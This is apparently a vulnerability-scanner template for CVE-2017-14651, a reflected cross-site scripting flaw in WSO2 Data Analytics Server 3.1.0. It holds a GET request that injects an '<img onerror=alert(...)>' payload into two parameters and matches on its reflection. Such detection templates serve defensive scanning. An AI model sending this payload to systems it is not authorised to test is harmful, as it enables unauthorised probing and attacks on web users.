id: CVE-2017-14651
info:
  author: mass0ma
  classification:
    cve-id: CVE-2017-14651
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 4.8
    cwe-id: CWE-79
  description: WSO2 Data Analytics Server 3.1.0 is susceptible to cross-site scripting
    in carbon/resources/add_collection_ajaxprocessor.jsp via the collectionName or
    parentPath parameter.
  name: WSO2 Data Analytics Server 3.1.0 - Reflected Cross-Site Scripting
  reference:
  - https://github.com/cybersecurityworks/Disclosed/issues/15
  - https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2017-0265
  - https://cybersecurityworks.com/zerodays/cve-2017-14651-wso2.html
  - https://nvd.nist.gov/vuln/detail/CVE-2017-14651
  severity: medium
  tags: cve,cve2017,wso2,xss
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <img src=x onerror=alert(document.domain)>
    - Failed to add new collection
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/carbon/resources/add_collection_ajaxprocessor.jsp?collectionName=%3Cimg%20src=x%20onerror=alert(document.domain)%3E&parentPath=%3Cimg%20src=x%20onerror=alert(document.domain)%3E'
